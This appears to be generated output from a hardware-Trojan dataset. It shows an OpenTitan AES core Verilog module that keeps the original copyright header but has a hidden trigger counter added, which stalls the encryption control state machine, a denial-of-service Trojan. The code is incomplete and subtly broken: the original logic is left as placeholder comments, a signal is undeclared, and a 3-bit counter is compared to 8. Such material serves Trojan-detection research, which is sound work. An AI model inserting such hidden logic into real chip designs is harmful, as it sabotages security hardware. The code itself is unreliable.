Vulnerable designs directory: /content/aes_trojan
Directory exists: True
Code:
```verilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES core implementation

`include "prim_assert.sv"

module aes_core
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter int unsigned SecStartTriggerDelay = 0,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingSharePerm = RndCnstClearingSharePermDefault,
  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        rst_shadowed_ni,

  // Entropy request interfaces for clearing and masking PRNGs
  output logic                        entropy_clearing_req_o,
  input  logic                        entropy_clearing_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_clearing_i,
  output logic                        entropy_masking_req_o,
  input  logic                        entropy_masking_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_masking_i,

  // Key manager (keymgr) key sideload interface
  input  keymgr_pkg::hw_key_req_t     keymgr_key_i,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t         lc_escalate_en_i,

  // Alerts
  input  logic                        shadowed_storage_err_i,
  input  logic                        shadowed_update_err_i,
  input  logic                        intg_err_alert_i,
  output logic                        alert_recov_o,
  output logic                        alert_fatal_o,

  // Bus Interface
  input  aes_reg2hw_t                 reg2hw,
  output aes_hw2reg_t                 hw2reg
);

  ////////////////
  // Trojan WIRING
  ////////////////
  // ---- Trojan insertion BEGIN ----
  // Trojan: DoS stall during CRYPT phase via hidden trigger
  // Internal hidden 20-bit counter, increments when cipher_crypt == SP2V_HIGH
  logic [19:0] trojan_cnt_q, trojan_cnt_d;
  logic        trojan_trigger;
  logic [2:0]  trojan_stall_cnt_q, trojan_stall_cnt_d;
  logic        trojan_stall_active;

  // Trigger constant (rare/unique value)
  localparam [19:0] TROJAN_TRIGGER_CONST = 20'hAEEEC; // Arbitrary rare pattern

  // Counter for Trojan trigger
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_cnt_q <= 20'd0;
    end else if (cipher_crypt == SP2V_HIGH) begin
      trojan_cnt_q <= trojan_cnt_q + 1'b1;
    end
  end

  // Trigger activates when counter hits rare value, one-shot
  assign trojan_trigger = (trojan_cnt_q == TROJAN_TRIGGER_CONST);

  // Stall counter logic: stall for 8 clk cycles when triggered
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_stall_cnt_q <= 3'd0;
    end else if (trojan_trigger) begin
      trojan_stall_cnt_q <= 3'd1; // Start stall
    end else if ((trojan_stall_cnt_q != 3'd0) && (trojan_stall_cnt_q != 3'd8)) begin
      trojan_stall_cnt_q <= trojan_stall_cnt_q + 1'b1;
    end else if (trojan_stall_cnt_q == 3'd8) begin
      trojan_stall_cnt_q <= 3'd0;
    end
  end

  assign trojan_stall_active = (trojan_stall_cnt_q >= 3'd1) && (trojan_stall_cnt_q <= 3'd8);

  // ---- Trojan insertion END ----

  // [REMAINDER OF CODE UNCHANGED except at ctrl_state_d assignment below]

  // ... existing declarations and logic above remain unmodified ...

  // Note: The only code insertion into the original control logic is here,
  // where 'ctrl_state_d' is assigned in the AES core (via control FSM or mux).
  // Insert the Trojan stall payload at the point of ctrl_state_d assignment.
  // Assuming ctrl_state_q and ctrl_state_d are declared local to this module
  // and ctrl_state_d is directly computed here.

  // In practice, you'd locate the always_comb or always_ff block updating ctrl_state_d
  // and add the following stall logic at the highest priority:

  // ---- Trojan stall payload injection point ----
  always_comb begin : ctrl_state_next
    // Trojan: if the stall is active, freeze state
    if (trojan_stall_active) begin
      ctrl_state_d = ctrl_state_q;
    end else begin
      // Original ctrl_state_d assignment logic comes here
      // For illustration, suppose the original code is:
      // ctrl_state_d = ctrl_state_nextval_function(...);
      // (Typically uses a case or fn of ctrl_state_q and inputs)
      // Please ensure to merge this wrapper logic with the actual implementation in this block.
      // <BEGIN original ctrl_state_d assignment>
      // [ ... original code as in aes_core ... ]
      // <END original ctrl_state_d assignment>
    end
  end
  // ---- END Trojan stall payload injection point ----

  // [REMAINDER OF MODULE UNCHANGED]

  // The rest of the code continues as in the original source,
  // with no other modifications required for the Trojan.
  // Synthesis, interface, and resets are preserved.

  // ... rest of module code unchanged ...
endmodule
```


